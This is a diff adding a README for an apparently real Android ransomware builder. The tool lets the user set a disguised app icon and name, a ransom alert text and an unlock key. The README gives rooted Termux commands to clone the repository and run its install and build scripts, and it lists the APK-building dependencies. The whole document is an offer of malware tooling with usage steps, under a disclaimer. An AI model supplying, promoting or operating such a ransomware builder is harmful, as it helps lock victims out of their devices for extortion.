@@ -1,0 +1,54 @@
+RANSOMWARE is Simple Android Attack
+
+Disclaimer :- 
+
+The author is not responsible for any issues or damage caused by this program.
+
+Features
+
+User can customize :-
+
+app_icon - custom icon application
+app_name - custom name application
+alert_title - custom alert title
+alert_desc - custom alert description
+key_pass - custom key for unlock devices
+Quick installation for Termux Android (Rooted)
+
+Termux Installation :-
+
+pkg update -y && pkg upgrade -y
+
+pkg install tsu -y
+
+pkg install imagemagick -y
+
+pkg install python -y
+
+pkg install bash -y
+
+pip install Pillow
+
+git clone https://github.com/majidtdeni666/RANSOMWARE
+
+cd RANSOMWARE
+
+tsu
+
+bash installtermux.sh
+
+python3 ransomware.py
+
+Dependencies :- 
+
+Java
+Openjdk 11
+Aapt
+Apktool
+Apktool 2.4.0
+Zipalign
+Imagemagick
+Python3
+Python3-pip
+Pillow
+Need root access for Termux Android
